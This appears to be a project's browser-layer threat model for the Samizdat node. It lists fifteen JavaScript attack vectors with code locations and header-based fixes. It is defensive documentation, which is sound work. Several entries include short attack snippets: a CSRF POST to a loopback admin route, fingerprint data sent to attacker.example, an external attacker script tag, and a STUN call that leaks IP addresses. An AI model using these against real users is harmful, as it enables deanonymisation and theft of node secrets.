# JavaScript security

## Scope and threat model

The adversary modelled here is state-level (NSA-class): well-resourced, willing
to publish content into the Samizdat network for the specific purpose of
running JavaScript inside a target user's browser, willing to host attacker-
controlled origins outside the network (`attacker.example`) and to time-
correlate observations across the public internet. The goal of the adversary
is one of: deanonymise the user, exfiltrate the node's secrets (admin token,
series private keys, identity material), or take over the local node by
issuing admin operations that look like the user issued them.

This document catalogues the JavaScript-layer attack surface only. The non-JS
boundaries (proxy stripping headers, `deny_outside_requests`, QUIC riddles,
hub federation reflection, build-script symlink refusal) are covered in
`docs/threat-model.md` and are not restated here.

The honest framing: the browser is the most under-defended surface in
Samizdat. The project's auth model assumes "loopback" is a trust boundary,
which is sound against off-host network attackers but is *not* sound against
a malicious page running in the user's own browser. That page is also "on
loopback" as far as `deny_outside_requests` can tell. Every defence after
that point relies on CORS preflight, the `Referer` header, and the absence
of a same-origin grant for sensitive entities. CSP, framing, and resource
isolation headers are absent today.

## The single-origin problem

Every series, every identity, every page served by the node lives at one
origin: `http://127.0.0.1:4510`. The routes are path-segmented (`/~bank/`,
`/~news/`, `/_series/<key>/...`) but the *origin* is shared. The proxy
flattens things similarly: every series and identity is reachable through
`https://proxy.hubfederation.com/...`, so the proxy origin too lumps
everything into one.

Inside one origin, web platform contracts treat the contents as one
application. Concretely, every Samizdat-served page sees the same:

- `localStorage`, `sessionStorage`
- `IndexedDB`
- `Cache Storage` (the `caches` global) and the HTTP cache
- cookies (none set today, but the contract is there)
- service workers, including their scope rules and `Clients.matchAll`
- `BroadcastChannel`, `SharedWorker`, `MessageChannel`
- `window.open` / `window.opener` / `postMessage` between same-origin frames

So a malicious page served at `/~attacker/` can read storage that a
legitimate page at `/~bank/` wrote, can install a service worker that
intercepts requests for `/~bank/`, can open a `BroadcastChannel` that any
other Samizdat page listens on, and can `fetch` any sibling entity's
resources without a cross-origin barrier. The path-based "entity" the auth
layer extracts from the `Referer` is an authorization concept; it is *not*
a same-origin policy.

The redesign that closes this at the root is per-series subdomain
isolation. A series at public key K could be served at
`<base64(K)>.localhost:4510` and an identity at
`<handle>.localhost:4510`. Browsers treat each subdomain of `localhost`
as a separate origin for the purposes of storage, service workers,
cookies, and CORS. This is a structural change to URL routing and to
relative-link semantics in published content, but it is the only fix that
makes the browser web platform agree with the access-control model
Samizdat already has in mind.

## Threats

### T1. Service worker survives series uninstall and intercepts other series
**Vector** -- Malicious series content registers a service worker via
`navigator.serviceWorker.register('/sw.js')`. The worker is registered at
origin scope `http://127.0.0.1:4510/`. It survives the user navigating
away, survives the series being unsubscribed/removed from the node, and
intercepts `fetch` for every other Samizdat-served path on the same origin.
**Current state** -- No service-worker scoping at the HTTP layer.
`node/src/http/mod.rs:152` assembles routes; none add
`Service-Worker-Allowed` headers or refuse to serve scripts under a path
that would let the browser register them at the root scope. I could not
locate any service-worker-related code.
**What an attacker gets** -- Persistent man-in-the-middle on every
samizdat-served page until the user manually unregisters the worker from
browser devtools. The worker can rewrite responses for `/~bank/`,
exfiltrate request bodies, mint fake `Authorization` failures.
**Severity** -- critical: persistent, cross-entity, survives uninstall.
**Fix** -- In `node/src/http/mod.rs`, add a middleware that refuses to
serve any response with `Service-Worker-Allowed` outside `/_series/<key>/`
or `/~<handle>/` subtrees, and that always emits
`Service-Worker-Allowed: /_series/<key>/` (or the entity scope) for
scripts inside those subtrees. Better still, refuse to serve scripts at
all paths shallow enough to register a root-scoped worker: any `.js`
served at `/sw.js`, `/`, or `/index.js` should be answered with an empty
header or `Service-Worker-Allowed: /none/`. Per-subdomain origins (see
single-origin problem) makes this go away.

### T2. Page on samizdat-served origin reads admin/read tokens via fetch
**Vector** -- A page at `http://127.0.0.1:4510/~attacker/` runs JS that
calls `fetch('/_register?right=ManageSeries', ...)` or follows the
`doAuthenticationFlow` popup to acquire `ManageSeries` for itself, then
calls `/_series-owners` to read every series owner's private key bytes.
**Current state** -- `node/src/http/auth.rs:622` serves `/_register` for
any entity that asks; the user has to click through, but
`docs/threat-model.md` already notes that `ManageSeries` is a flat right:
once granted to any entity, `js/src/index.ts:230-246` (`getSeriesOwner` /
`getSeriesOwners`) returns the keypair object including the secret.
**What an attacker gets** -- Series private keys. Permanent
impersonation of the series owner on the network: forging editions,
publishing arbitrary content under the user's identity. The token files
themselves (`admin-token` mode 0640, `read-token` mode 0644 per
`node/src/access.rs:99-117`) are NOT readable from the browser, but the
admin capabilities reachable via entity rights are equivalent for many
purposes.
**Severity** -- critical: social-engineered grant of `ManageSeries`
exfiltrates series secrets to attacker-controlled JS.
**Fix** -- Stop returning private key bytes in `/_series-owners`
responses; require an explicit "reveal secret" route gated on
`TokenScope::Admin` bearer ONLY (no entity-rights path). Mark
`ManageSeries` as per-entity rather than flat. The `/_register` template
should additionally warn the user when the requesting entity is *not* an
identity the user has otherwise interacted with.

### T3. Off-origin page CSRFs `/_*` admin endpoints
**Vector** -- A page on `https://attacker.example` issues `fetch(
'http://127.0.0.1:4510/_vacuum/flush-all', { method: 'POST',
mode: 'no-cors', body: 'x', headers: {'Content-Type': 'text/plain'} })`.
This is a CORS-simple request, no preflight; the browser sends it.
The node receives it, sees a loopback peer (the user's browser),
`deny_outside_requests` passes.
**Current state** -- `node/src/http/mod.rs:179-196` gates `/_vacuum/*`
with `authenticate_trusted_context` which requires either a `Referer`
matching `/_register` OR a bearer token. A cross-origin `fetch` from
`https://attacker.example` will include `Referer:
https://attacker.example/...` (default `Referrer-Policy` for same-origin
navigations is `strict-origin-when-cross-origin`); `check_origin` at
`node/src/http/auth.rs:180-195` rejects non-loopback origins, so the
request is refused. Good. But that defence depends on the `Referer`
being sent at all: a page using `Referrer-Policy: no-referrer` will
strip it, and `entity_from_referrer` returns `MissingReferer`. For
`authenticate_trusted_context` this denies (good); for any route that
treats missing `Referer` as `entity = None` and grants `Public`-rights
access (most read routes via `do_authenticate_security_scope`), the
request passes. That is the surface: any future write route that opts
into `read; AccessRight::Public` is silently CSRF-able cross-origin.
**What an attacker gets** -- Today, very little (the gated routes are
guarded; vacuum is closed). Tomorrow, whatever new write route someone
adds with `Public` rights becomes a cross-origin CSRF target.
**Severity** -- medium: today's catalogue of `Public`-grant write routes
is empty; the concern is regression.
**Fix** -- Add an origin/Host check to every state-mutating route, not
just `_vacuum`. Centralise it in `deny_outside_requests` so that POST,
PUT, PATCH, DELETE without a `Referer`-matching-loopback OR a bearer
token are rejected unconditionally. Document the rule in `auth.rs`
module-doc.

### T4. Browser-side fingerprinting and phone-home
**Vector** -- Published series content runs canvas/audio/WebGL/font
enumeration, hashes the result, and POSTs to
`https://attacker.example/collect`. The attacker correlates the hash
across sessions, devices, identities.
**Current state** -- No CSP at all. `node/src/http/resolvers.rs:26-39`
serves objects with `Content-Type` and Samizdat-prefixed metadata; no
`Content-Security-Policy`, no `connect-src`, no `script-src`.
**What an attacker gets** -- Stable cross-session identifier of the
user. Combined with the public IP visible to `attacker.example`, this
deanonymises the user even if they only ever view content "anonymously"
through Samizdat.
**Severity** -- high: passive deanonymisation by mere page view.
**Fix** -- Emit a strict CSP from the resolver. See "Defensive primitives".
The relevant code is `node/src/http/resolvers.rs:68` (new objects) and
`node/src/http/resolvers.rs:97` (existing objects); both build
`Resolved` with `ext_headers`. Add CSP to both. Apply consistently in a
shared helper so the headers cannot drift.

### T5. WebRTC LAN/public-IP leak
**Vector** -- A page calls
`new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})`,
creates a data channel, and reads `icecandidate` events. The browser
emits host candidates (LAN IPs and hostnames) and server-reflexive
candidates (public IP via STUN), bypassing every browser-level "do not
phone home" intent the user has.
**Current state** -- No `Permissions-Policy` on responses. I could not
locate a relevant header anywhere in `node/src/http/`.
**What an attacker gets** -- LAN topology, public IP. With a VPN this is
the VPN exit. Without, this is the user's home IP. Either way
deanonymising.
**Severity** -- critical against a state-level adversary whose objective
is deanonymisation.
**Fix** -- Emit `Permissions-Policy: ... camera=(), microphone=(),
geolocation=(), gyroscope=(), payment=()` plus the CSP `connect-src
'self'` (which alone blocks STUN/TURN to non-self). Browsers vary in
how aggressively they enforce `connect-src` over WebRTC; the
defence-in-depth answer is also a feature policy that disables WebRTC
entirely for non-trusted entities. Apply in
`node/src/http/resolvers.rs` as above.

### T6. Clickjacking via iframe embed
**Vector** -- `attacker.example` embeds
`<iframe src="http://127.0.0.1:4510/~bank/transfer"></iframe>` and
overlays UI to trick the user into clicking through. The samizdat-
served page renders with no framing restriction.
**Current state** -- No `X-Frame-Options`, no CSP `frame-ancestors`.
Not present in `node/src/http/resolvers.rs`, not present in any
middleware in `node/src/http/mod.rs`.
**What an attacker gets** -- UI redress on any samizdat-served page
that takes a user action (a click, a form submit, a popup open). On the
node side, the request looks like a same-origin click from the
samizdat-served page, so trusted-context checks pass.
**Severity** -- high: amplifies T2 (a "click to authorize" can be
clickjacked into "ManageSeries granted").
**Fix** -- Emit `X-Frame-Options: DENY` (legacy) and CSP
`frame-ancestors 'none'` from every response. Same site:
`node/src/http/resolvers.rs:26` for objects, plus a global response
middleware in `node/src/http/mod.rs:225` covering API responses.

### T7. MIME sniffing
**Vector** -- Attacker uploads content with `Content-Type: text/plain`
but body that browsers historically sniff as HTML or JS. Without
`X-Content-Type-Options: nosniff`, the response is executed as HTML.
**Current state** -- `node/src/http/resolvers.rs:28` and `:50` set
`Content-Type` only. No `nosniff` header. `ObjectHeader::new` accepts
any content type the publisher named.
**What an attacker gets** -- Active content (HTML/JS) under any URL
where the publisher claimed it was inert (text, image, etc.). Critical
when the storing entity is trusted by the victim but the *content* came
from a third party (re-upload, mirror, subscription).
**Severity** -- high: bypass of "this is just a text file" assumptions
in linking/reference UIs.
**Fix** -- Add `X-Content-Type-Options: nosniff` in the same
`Resolved::into_response` path. One line.

### T8. SVG with embedded `<script>`
**Vector** -- Publish an object with `Content-Type: image/svg+xml` that
contains `<script>` inside the SVG. The browser, when navigating to the
SVG URL or `<embed>`ing/`<iframe>`ing it, executes the script in the
SVG's origin (which is the samizdat origin).
**Current state** -- No content rewriting. `node/src/http/resolvers.rs`
streams object bytes as-is.
**What an attacker gets** -- Script execution under the samizdat
origin from a "harmless image". Promotes any image hosting into T2/T4.
**Severity** -- high.
**Fix** -- Serve `image/svg+xml` with CSP `script-src 'none'` (the same
CSP from T4 already does this if `script-src 'self'` and the SVG is
inline-`<script>`-only; SVG embedded script is treated as inline). Or,
content-type-rewrite: serve any svg to `image/svg+xml; charset=utf-8`
and additionally `Content-Disposition: attachment` so navigation
downloads rather than renders. The cleanest fix is to refuse to render
SVG inline; serve as `application/octet-stream` for objects without an
allowlisted MIME.

### T9. Cross-series JS pull
**Vector** -- A page at `/~attacker/` includes
`<script src="/_series/<other-key>/sensitive.js">`. The browser fetches
it from the same origin; the script executes in `~attacker`'s context.
This is correct per the web platform: same origin, same script tag.
**Current state** -- Direct consequence of the single-origin model.
`node/src/http/series.rs:34-67` happily serves the content; there is no
origin-comparison defence.
**What an attacker gets** -- Reads of script-shaped resources from
sibling entities, executed in the attacker entity's context. The
`Referer` the node sees is `~attacker`'s page, so any later admin call
the attacker makes via JS does NOT pick up the victim entity's rights.
The damage is read-only-of-the-script-body, but the script body can
itself contain secrets (config, baked-in tokens).
**Severity** -- medium today (depends on what scripts contain),
structurally high (any future per-entity browser session model breaks).
**Fix** -- Per-series subdomain isolation. No header fix closes this.

### T10. Cache and Cache-Storage as persistent fingerprint
**Vector** -- A page writes an entry to `caches.open('attacker').then(
c => c.put('/marker', new Response('uuid')))`. Next session, the same
page reads the marker. Identifier survives across page loads, across
restarts of the browser, across switching networks, until the user
manually clears site data for `127.0.0.1`. The HTTP cache supports the
same idea via cache-keying tricks on intermediate ETags.
**Current state** -- No `Clear-Site-Data` header anywhere. No
`Cache-Control: no-store` default. The Samizdat node sets `ETag` per
content hash (`node/src/http/resolvers.rs:73,102`) which is content-
addressed and stable; that is appropriate for content delivery but means
a page can fingerprint *the user's catalogue of seen content* via
selective revalidation.
**What an attacker gets** -- Long-lived per-browser identifier, plus an
oracle for "has this user ever fetched this object hash before".
**Severity** -- high for deanonymisation.
**Fix** -- Send `Clear-Site-Data: "cache", "storage"` when the user
"forgets" an entity (a new admin route invoked by the CLI / UI on
unsubscribe). Per-subdomain isolation again helps: clearing storage for
one subdomain does not affect others. Consider `Cache-Control:
no-store` for HTML responses (not for content objects, which are
content-addressed and benefit from caching).

### T11. Persistent supply-chain via external `<script src=https://...>`
**Vector** -- A subscribed series ships a page with
`<script src="https://cdn.attacker.example/lib.js"></script>`. Every
time the user visits, the browser fetches from
`cdn.attacker.example`, leaking the user's IP and a load-pattern that
identifies which Samizdat content they are reading. The script runs in
the samizdat origin and can do everything T2 and T4 do.
**Current state** -- No content-ingest validation. `node/src/models/`
accepts arbitrary HTML. The proxy at `proxy/src/http.rs:107-109`
rewrites HTML through `proxy_page` but the rewrite does not look at
`<script src>`.
**Severity** -- critical: long-lived back door planted by anyone the
user subscribes to.
**Fix** -- Two layers. At ingest, refuse to commit HTML containing
external `<script src>`, external `<link rel=stylesheet>`, or external
`<iframe>` (warn user, require an opt-in flag). At serve, the CSP
`script-src 'self'; connect-src 'self'; style-src 'self'` enforces it
regardless of what ingestion missed. Belt and braces; this surface is
too sharp for either alone.

### T12. crossOriginIsolated / SharedArrayBuffer / Spectre
**Vector** -- If COOP and COEP are absent (status quo), the page is
not cross-origin-isolated, so `SharedArrayBuffer` is unavailable and
Spectre-style attacks across origins are impractical for now. If a
future change accidentally enables them (e.g. `Cross-Origin-Opener-
Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`),
SAB becomes available and a malicious page can run Spectre primitives
to read memory across origins.
**Current state** -- COOP/COEP absent. Confirmed: no occurrence in
`node/src/http/` headers.
**What an attacker gets** -- Today: nothing (status quo blocks SAB).
After an accidental enabling: cross-process memory disclosure.
**Severity** -- low today, high if the headers get enabled without the
rest of the isolation contract.
**Fix** -- Document the dependency in `node/src/http/mod.rs` and add a
test that asserts COOP/COEP combination is either both off or both on
together with `Cross-Origin-Resource-Policy: same-origin`. If future
work needs SAB (e.g. WASM threading for content rendering), do the full
isolation contract; otherwise keep them off.

### T13. Loopback as trust boundary
**Vector** -- `deny_outside_requests` (`node/src/http/mod.rs:208-221`)
treats 127.0.0.1 as "the local user". A page in the user's own browser
*is* a request from 127.0.0.1: the connection's peer address is the
loopback socket the browser opened. The middleware passes; everything
after relies on `Referer`, `Origin`, CORS, and per-route auth.
**Current state** -- This is by design and documented in
`docs/threat-model.md`. The risk is that an agent reading the code may
assume "loopback means trusted" and add a write route without further
gating.
**What an attacker gets** -- Whatever the next-most-permissive route
exposes. See T3.
**Severity** -- medium: structural risk of future regression rather
than a present-day bug.
**Fix** -- Rename `deny_outside_requests` to something like
`require_loopback_peer` to dispel the "this means trusted" reading.
Add a `// SECURITY:` comment block. Codify in `docs/conventions.md`
that any new write route MUST add an `Origin`/`Referer` check or a
bearer-token requirement, regardless of loopback.

### T14. Proxy origin vs local origin: header asymmetry
**Vector** -- The same content is served at two origins:
`http://127.0.0.1:4510` (local) and
`https://proxy.hubfederation.com` (via `proxy/src/http.rs`). Security
headers added on the node path are not necessarily forwarded by the
proxy, and vice versa.
**Current state** -- `proxy/src/http.rs:13-22` lists `PROXY_HEADERS`
that get forwarded: `ETag`, `X-Samizdat-Bookmark`, `X-Samizdat-Object`,
`X-Samizdat-Is-Draft`, `X-Samizdat-Collection`, `X-Samizdat-Series`,
`X-Samizdat-Edition`, `X-Samizdat-Query-Duration`. **No security
headers** (CSP, X-Frame-Options, X-Content-Type-Options, COOP, COEP,
Permissions-Policy, Referrer-Policy) appear in this list. If the node
ever starts emitting them they will be silently stripped by the proxy.
The proxy DOES add `Content-Type` (`proxy/src/http.rs:91-93`) but
nothing else.
**What an attacker gets** -- A way to bypass node-side hardening by
asking the user to visit the proxy URL instead of the local one.
**Severity** -- high once node-side headers are added; today, no
asymmetry because there is no header to strip.
**Fix** -- Extend `PROXY_HEADERS` to include every security header.
Better: when the proxy injects its own `proxy_page` rewrite
(`proxy/src/http.rs:109`), inject the same security headers
authoritatively so the proxy origin is hardened *independently* of what
the node sent. The proxy origin is a single origin spanning all
identities, which means single-origin problems (T1, T9) are even worse
there; per-subdomain isolation at the proxy is essential too.

### T15. Identity vs path confusion
**Vector** -- The address bar shows `~bank.example/login` while the
content rendered is from a different identity (or from a path in a
different entity). Could JS make this happen?
**Current state** -- `IdentityRef::from_str`
(`node/src/http/identities.rs:31-44`) rejects empty, `~`, `.`, `..`,
and underscore-prefixed handles. `resolve_identity`
(`node/src/http/resolvers.rs:304-320`) resolves the handle to a series
and serves a collection item from that series's freshest edition. A
malicious identity owner CAN serve any content they like under their
own handle; they cannot make the address bar show a *different*
identity's name without `history.pushState` / `replaceState` -- and
those are constrained by the same-origin policy to URLs on the same
origin. Within one origin (the single-origin problem), the attacker can
manipulate the path part of the URL freely to read `~bank.example/...`
in the address bar even while serving content that points to other
entities. The browser's address bar will reflect `pushState`'s URL but
the *origin* is still `127.0.0.1:4510`.
**What an attacker gets** -- UI deception: the user sees
`http://127.0.0.1:4510/~bank.example/login` while the page itself was
loaded from `/~attacker/`. Combined with T9 (cross-series JS pull), the
attacker can render a convincing forgery.
**Severity** -- high for phishing.
**Fix** -- Per-series subdomain isolation. Once each identity is on
its own subdomain, `pushState` to another identity's path becomes a
cross-origin operation and is blocked by the browser. No middleware
fix on the current single-origin layout closes this.

## Defensive primitives to add

A bulleted list of headers and middleware changes that close many of the
threats above at once. For each: the file to modify, the concrete value, and
caveats.

- `Content-Security-Policy: default-src 'self'; script-src 'self';
  connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'` -- apply in
  `node/src/http/resolvers.rs` inside `Resolved::into_response`
  (`resolvers.rs:26`) so every content response carries it, and in a
  global middleware added to `node/src/http/mod.rs:228-233` for the API
  responses. Caveat: `style-src 'unsafe-inline'` is a concession to
  existing inline styles in published HTML; tightening to `'self'` will
  break a lot of content. Caveat: `connect-src 'self'` neuters most
  WebRTC STUN/TURN; verify across Chromium and Firefox. Closes T4, T5,
  T6, T8, T11.

- `X-Content-Type-Options: nosniff` -- apply in
  `node/src/http/resolvers.rs:26` (objects) and in a global middleware
  for API responses. No compatibility caveat. Closes T7.

- `X-Frame-Options: DENY` -- legacy alias for `frame-ancestors 'none'`;
  apply alongside CSP. Same locations. Closes T6 in legacy browsers.

- `Referrer-Policy: no-referrer` -- apply globally in
  `node/src/http/mod.rs:228-233`. Caveat: the current auth model
  *requires* `Referer` for entity-rights extraction
  (`auth.rs:222-235`). Setting `no-referrer` on responses controls only
  what THIS origin sends OUT; the requests INTO the node from same-
  origin pages still carry `Referer`. Verify by reading the spec, not
  from memory.

- `Cross-Origin-Opener-Policy: same-origin` -- apply globally. Caveat:
  changes the semantics of the `_register` popup
  (`js/src/auth.ts:32-65`) which uses `window.open` and waits for an
  `auth` CustomEvent dispatched from the popup. With COOP `same-origin`
  the opener-opened pair still works because they share origin, but
  test thoroughly.

- `Cross-Origin-Embedder-Policy: require-corp` -- apply globally only
  alongside COOP and CORP. Caveat: requires every embedded resource
  (images, scripts, stylesheets) to opt in via CORP or CORS; will break
  any published page that embeds resources without the header. Defer
  until per-subdomain isolation is in.

- `Cross-Origin-Resource-Policy: same-origin` -- apply on response in
  `node/src/http/resolvers.rs:26`. Prevents other origins from
  embedding samizdat-served resources via `<img>`/`<script>`/`<link>`.
  Caveat: breaks any legitimate external embedding (the proxy itself
  is the same origin from `proxy.hubfederation.com`, separate from
  `localhost`; check whether the proxy needs to receive CORS-friendly
  CORP for its rewrite to work).

- `Permissions-Policy: camera=(), microphone=(), geolocation=(),
  interest-cohort=(), gyroscope=(), payment=(), usb=(), midi=(),
  serial=()` -- apply globally. No compatibility caveat for content
  that doesn't legitimately need these. Closes T5 in part.

- Service-worker scope refusal -- middleware in
  `node/src/http/mod.rs` that intercepts any response whose path could
  register a root-scoped worker. Refuse to serve `sw.js`, `/sw.js`,
  `/service-worker.js`, anything at root path. For scripts under
  `/_series/<key>/` or `/~<handle>/`, optionally set
  `Service-Worker-Allowed:` to the entity's prefix so the worker
  scope cannot escape. Closes T1.

## Items already covered elsewhere

- The bearer-token / Referer dual auth model is laid out in
  `docs/threat-model.md` under "What is authenticated, and what
  isn't"; not restated here.
- The proxy's GET-only / strip-Authorization / strip-Referer behaviour
  is in `docs/threat-model.md` under "Proxy". This document covers
  only the *headers in the proxy response back to the browser*, which
  the threat model doc does not cover.
- The flat-rights `ManageSeries` issue is on the deferred list (see
  `docs/threat-model.md` "A malicious local web page in the user's
  browser" and `docs/audit-history.md`). T2 here makes the
  browser-layer consequence concrete.
- The hub-federation reflection primitive is `threat-model.md`'s "A
  peer node deep in the federation graph"; out of scope here.

## Open questions for Pedro

- Move to per-series subdomain isolation
  (`<base64-key>.localhost:4510`) and break the single-origin problem
  at the root? This is the only structural fix for T1, T9, T10, T15.
  Costs: relative-link semantics in published content change; CLI URL
  printing changes; CI fixtures change; proxy must also do subdomain
  mapping.
- Disallow `<script src="https://...">` and similar external resource
  references at content-ingest time, or rely only on CSP at serve
  time? Ingest-time is offline and cheap; CSP at serve-time is
  defence in depth. Both is the right answer; question is whether the
  ingest-time check is a hard block or a warning.
- Accept that the `~name` URL form (identity, mutable, attacker-
  controllable handle) is a separate trust domain than
  `_series/<key>` (immutable public key)? If yes, the per-subdomain
  scheme should put each `~handle` on its own subdomain too, AND the
  CSP for `~handle` content can be tighter (no `eval`, no inline) by
  default since the handle layer is mutable.
